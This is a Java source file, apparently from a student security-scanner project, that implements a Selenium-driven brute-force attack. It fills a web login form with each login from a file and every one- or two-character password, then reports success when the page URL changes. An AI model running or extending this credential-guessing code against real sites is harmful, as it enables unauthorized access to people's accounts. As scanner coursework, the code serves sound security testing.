package fr.isep.softsecu.attackreport.attacks;

import fr.isep.softsecu.attackreport.Attack;
import fr.isep.softsecu.attackreport.Report;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.NoSuchElementException;

public class BruteForceAttack extends DictionaryAttack {

    private static final int TIMEOUT = 200;
    private String loginUrlStr;

    private static final String LOGIN_FILE_PATH = "src/main/java/fr/isep/softsecu/attackreport/ressources/login.txt";// Adjust the file path as needed
    private static final List<String> LOGINS = loadFromFile(LOGIN_FILE_PATH);
    private static final String CHARACTER_SET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    private static final int MIN_LENGTH = 1;
    private static final int MAX_LENGTH = 2;

    @Override
    public List<Class<? extends Attack>> getRequiredPreviousAttacks() {
        return List.of(FindLoginPageAttack.class);
    }

    @Override
    public void setPreviousAttacks(List<Attack> previousAttacks) {
        for (Attack previousAttack : previousAttacks) {
            if (previousAttack instanceof FindLoginPageAttack findLoginPageAttack) {
                loginUrlStr = findLoginPageAttack.getLoginUrlStr();
            }
        }
    }

    @Override
    public void run(Report report, String ip, int port) {
        try {
            ChromeOptions options = new ChromeOptions();
            options.addArguments("--headless");
            WebDriver driver = new ChromeDriver(options);
            driver.get(loginUrlStr);
            driver.manage().timeouts().implicitlyWait(Duration.ofMillis(TIMEOUT));

            performBruteForceAttack(report, driver, loginUrlStr);

            driver.quit();
        } catch (Exception e) {
            System.out.println("Brute force attack failed on " + loginUrlStr);
            e.printStackTrace();
        }
    }

    private void performBruteForceAttack(Report report, WebDriver driver, String urlStr) {
        try {
            System.out.println("Performing brute force attack on " + urlStr);
            for (String login : LOGINS) {
                for (int length = MIN_LENGTH; length <= MAX_LENGTH; length++) {
                    List<String> bruteForceAttacks = generateBruteForceAttacks(length);
                    for (String attempt : bruteForceAttacks) {
                        driver.get(urlStr);
                        driver.manage().timeouts().implicitlyWait(Duration.ofMillis(TIMEOUT));

                        WebElement credential;

                        WebElement passwordElement = driver.findElement(By.name("password"));
                        WebElement submit = driver.findElement(By.cssSelector("[type='submit']"));

                        try {
                            credential = driver.findElement(By.cssSelector("input[name='email']"));
                        } catch (NoSuchElementException e) {
                            credential = driver.findElement(By.name("input[name='username']"));
                        }

                        System.out.println("Trying \"" +  login + "\" + \"" + attempt + "\"");

                        credential.sendKeys(login);
                        passwordElement.sendKeys(attempt);
                        submit.click();

                        // Clicking the submit button may cause the page to reload or redirect, so we wait until timeout to check if the page has changed
                        try {
                            Thread.sleep(TIMEOUT);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                        if (!driver.getCurrentUrl().equals(urlStr)) {
                            System.out.println("Login successful with login \"" + attempt + "\")");
                            report.append("Login successful with login \"" + attempt + "\")");
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private List<String> generateBruteForceAttacks(int length) {
        List<String> attacks = new ArrayList<>();

        generateAttacksRecursively("", length, CHARACTER_SET, attacks);

        return attacks;
    }

    private void generateAttacksRecursively(String currentAttempt, int length, String characterSet, List<String> attacks) {
        if (length == 0) {
            attacks.add(currentAttempt);
            return;
        }

        for (int i = 0; i < characterSet.length(); i++) {
            char currentChar = characterSet.charAt(i);
            generateAttacksRecursively(currentAttempt + currentChar, length - 1, characterSet, attacks);
        }
    }

    @Override
    public String getAttackName() {
        return "Brute Force Attack";
    }

    public record LoginAttempt(String login, String password) {
    }
}
